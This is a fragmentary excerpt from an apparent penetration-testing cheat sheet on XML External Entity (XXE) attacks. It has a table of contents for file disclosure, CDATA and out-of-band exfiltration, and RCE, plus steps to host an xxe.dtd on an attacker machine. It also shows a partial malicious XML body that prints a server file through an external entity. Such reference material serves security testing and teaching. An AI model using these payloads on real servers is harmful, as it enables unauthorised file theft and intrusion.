...
* [Local File Disclosure](#local-file-disclosure)
	- [Using PHP wrapper](#using-php-wrapper)
	- [Data Exfiltration with CDATA](#data-exfiltration-with-cdata)
	- [Blind Based XXE](#blind-based-xxe)
		- [Error Based](#error-based)
		- [Out-of-band Exfiltration](#out-of-band-exfiltration)
			- [Manually](#manually)
			- [Automated](#automated)
- [RCE](#rce)
	- [PHP](#php)
...
Encode PHP source files, so they don't break the XML format when referenced.
...
We can wrap the content of the external file reference with a `CDATA` tag (e.g. `<![CDATA[ FILE_CONTENT ]]>`). This way, the XML parser would consider this part raw data, which may contain any type of data, including any special characters.

On the attacker host, Create `xxe.dtd` and start a web server:
...
Send the malicious XML payload to the target:
...
<root>
	<name>a</name>
	<tel>1</tel>
	<email>&joined;</email>    <!-- reference the &joined; entity from our web server to print the file content -->
	<message>123</message>
</root>
```
...
On attacker machine, Create `xxe.dtd` with the content:
